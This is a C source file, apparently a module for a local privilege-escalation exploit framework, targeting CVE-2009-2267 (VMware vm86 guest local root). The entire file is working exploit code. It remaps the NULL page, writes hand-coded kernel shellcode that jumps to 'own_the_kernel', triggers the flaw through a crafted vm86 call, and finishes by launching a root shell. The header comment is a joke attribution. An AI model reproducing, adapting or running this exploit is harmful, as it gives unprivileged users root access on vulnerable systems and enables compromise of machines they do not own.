/* all credits to Tavis Ormandy/Julien Tinnes

   I (being Ingo Molnar, of course) simply replaced the ring0 XSS
   with more suitable shellcode
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/vm86.h>
#include <sys/types.h>
#include "exp_framework.h"

struct exploit_state *exp_state;

char *desc = "CVE-2009-2267: VMWare vm86 guest local root";
char *cve = "CVE-2009-2267";

#define REAL_TO_VIRT(cs, ip) ((void *)(((cs) << 4) + ((ip) & 0xffff)))
#define EFLAGS_TF_MASK 0x100

void enter_vm86(void)
{
	struct vm86plus_struct vm = {0};

	vm.cpu_type = CPU_586;

	vm.regs.eflags = EFLAGS_TF_MASK;
	vm.regs.esp = 0xdeadc01d;
	vm.regs.eip = 0x00000000;
	vm.regs.cs = 0x0090;
	vm.regs.ss = 0xffff;

	memcpy(REAL_TO_VIRT(vm.regs.cs, vm.regs.eip), 
		"\x9a\xdd\xcc\x00\x00\xbb\xaa", 7);

	vm86(VM86_ENTER, &vm);

	return;
}

int prepare(unsigned char *buf)
{
	char *newbuf;

	newbuf = (char *)mremap(buf, PAGE_SIZE, 1024 * 1024, 0);
	if (newbuf == MAP_FAILED) {
		printf("failed to remap NULL page\n");
		exit(1);
	}

	// mov esp, edi
	buf[0] = '\x89';
	buf[1] = '\xfc';
	// sub esp, 0x50
	buf[2] = '\x83';
	buf[3] = '\xec';
	buf[4] = '\x50';
	// call own_the_kernel
	buf[5] = '\xff';
	buf[6] = '\x15';
	*(unsigned int *)&buf[7] = (unsigned int)buf + 17;
	// jmp exit_kernel
	buf[11] = '\xff';
	buf[12] = '\x25';
	*(unsigned int *)&buf[13] = (unsigned int)buf + 21;
	*(unsigned long *)&buf[17] = (unsigned long)exp_state->own_the_kernel;
	*(unsigned long *)&buf[21] = (unsigned long)exp_state->exit_kernel;

	return 0;
}

int requires_null_page = 1;

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int trigger(void)
{
	enter_vm86();

	return 1;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
